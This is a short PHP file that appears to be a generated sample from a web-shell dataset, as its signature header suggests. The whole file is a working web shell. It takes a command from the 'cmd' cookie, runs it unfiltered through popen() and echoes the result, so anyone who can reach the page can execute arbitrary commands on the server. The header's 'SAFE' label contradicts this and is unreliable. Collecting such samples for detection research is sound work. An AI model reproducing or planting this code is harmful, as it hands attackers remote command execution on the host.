<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_ISSET; SKELETON=S3; KEY=cmd; SINK=B6; VAR=v0076 */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$inp = isset($_COOKIE["cmd"]) ? (string)$_COOKIE["cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B6($x);
};
$out = $f($inp);
echo (string)($out);
?>
